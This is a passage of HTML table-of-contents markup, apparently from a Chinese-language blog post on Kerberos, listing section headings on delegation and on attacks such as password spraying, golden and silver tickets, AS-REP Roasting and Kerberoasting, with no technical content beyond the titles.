class="toc-link" href="#2%E3%80%81S4u2Proxy"><span class="toc-text">2、S4u2Proxy</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-text">Kerberos协议中的安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PTH-PTK"><span class="toc-text">PTH &amp; PTK</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-text">域内用户枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-text">密码喷洒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">黄金票据 &amp; 白银票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AS-REP-Roasting%E6%94%BB%E5%87%BB"><span class="toc-text">AS-REP Roasting攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-text">Kerberoasting攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
       
     </div>
   </div>
